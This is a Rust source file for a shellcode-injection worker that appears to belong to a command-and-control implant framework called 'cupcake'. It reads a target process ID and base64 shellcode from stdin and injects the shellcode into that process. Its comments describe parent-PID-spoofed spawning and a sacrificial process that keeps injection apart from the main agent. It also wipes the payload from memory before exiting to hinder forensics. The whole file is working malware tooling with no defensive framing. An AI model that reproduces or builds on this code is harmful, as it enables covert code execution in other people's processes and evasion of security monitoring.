//! cupcake-inject-worker — short-lived sacrificial inject PE.
//!
//! Wire protocol on stdin (binary, same framing as ModuleSupervisor sends):
//!   magic   [4]    — cupcake_core::wire_ids::JOB_MAGIC
//!   kind    u32le  — must be 3 (inject)
//!   pay_len u32le
//!   arg_len u32le  — reserved, must be 0
//!   payload[pay_len] — UTF-8 JSON: {"pid":N,"data":"<b64 shellcode>","method":"auto","wait_ms":0}
//!
//! stdout: out_len u32le + err_len u32le + bodies. No C2 network.
//!
//! Console subsystem (not `windows`) so pipe-based CreateProcess job I/O is
//! reliable under the PPID-spoofed spawn used by ModuleSupervisor. Stage0 must
//! never map this image into the agent process.

use base64::Engine;
use std::io::{Read, Write};

const KIND_INJECT: u32 = 3;

fn main() {
    let _ = std::panic::catch_unwind(|| {
        if let Err(e) = run() {
            let _ = write_result(b"", e.as_bytes());
        }
    });
}

fn run() -> Result<(), String> {
    let mut stdin = std::io::stdin();
    let mut hdr = [0u8; 16];
    stdin
        .read_exact(&mut hdr)
        .map_err(|e| format!("read hdr: {e}"))?;
    if &hdr[0..4] != cupcake_core::wire_ids::JOB_MAGIC.as_slice() {
        return Err("bad job header".into());
    }
    let kind = u32::from_le_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]);
    let pay_len = u32::from_le_bytes([hdr[8], hdr[9], hdr[10], hdr[11]]) as usize;
    let arg_len = u32::from_le_bytes([hdr[12], hdr[13], hdr[14], hdr[15]]) as usize;
    if kind != KIND_INJECT {
        return Err(format!("inject worker: unsupported job kind {kind}"));
    }
    if pay_len > 16 * 1024 * 1024 || arg_len > 1024 {
        return Err("size limit".into());
    }
    let mut payload = vec![0u8; pay_len];
    if pay_len > 0 {
        stdin
            .read_exact(&mut payload)
            .map_err(|e| format!("read payload: {e}"))?;
    }
    let mut args = vec![0u8; arg_len];
    if arg_len > 0 {
        stdin
            .read_exact(&mut args)
            .map_err(|e| format!("read args: {e}"))?;
    }

    let (stdout, stderr) = match run_inject_job(&payload) {
        Ok(msg) => (msg, String::new()),
        Err(e) => (String::new(), e),
    };

    // Burn payload bytes in this process before exit
    for b in payload.iter_mut() {
        *b = 0;
    }
    for b in args.iter_mut() {
        *b = 0;
    }

    write_result(stdout.as_bytes(), stderr.as_bytes())
}

#[cfg(windows)]
fn run_inject_job(body: &[u8]) -> Result<String, String> {
    let v: serde_json::Value =
        serde_json::from_slice(body).map_err(|e| format!("inject json: {e}"))?;
    let pid = v
        .get("pid")
        .and_then(|x| x.as_u64())
        .or_else(|| v.get("target_pid").and_then(|x| x.as_u64()))
        .ok_or("missing pid")? as u32;
    let data_b64 = v
        .get("data")
        .and_then(|x| x.as_str())
        .ok_or("missing data (base64 payload)")?;
    let method = v.get("method").and_then(|x| x.as_str()).unwrap_or("auto");
    let wait_ms = v.get("wait_ms").and_then(|x| x.as_u64()).unwrap_or(0) as u32;

    let mut sc = base64::engine::general_purpose::STANDARD
        .decode(data_b64.trim())
        .map_err(|e| format!("payload b64: {e}"))?;
    if sc.is_empty() {
        return Err("empty payload after decode".into());
    }

    let result = cupcake_core::inject_shellcode(pid, &sc, method);
    for b in sc.iter_mut() {
        *b = 0;
    }
    match result {
        Ok(r) => {
            let _ = cupcake_core::wait_inject_thread(r.thread_handle, wait_ms);
            Ok(format!(
                "injected pid={} addr=0x{:x} method={}",
                r.pid, r.remote_addr, r.method
            ))
        }
        Err(e) => Err(format!("inject: {e}")),
    }
}

#[cfg(not(windows))]
fn run_inject_job(_body: &[u8]) -> Result<String, String> {
    Err("inject: windows only".into())
}

fn write_result(stdout: &[u8], stderr: &[u8]) -> Result<(), String> {
    let mut out = std::io::stdout();
    let ol = (stdout.len() as u32).to_le_bytes();
    let el = (stderr.len() as u32).to_le_bytes();
    out.write_all(&ol).map_err(|e| e.to_string())?;
    out.write_all(&el).map_err(|e| e.to_string())?;
    out.write_all(stdout).map_err(|e| e.to_string())?;
    out.write_all(stderr).map_err(|e| e.to_string())?;
    out.flush().map_err(|e| e.to_string())?;
    Ok(())
}
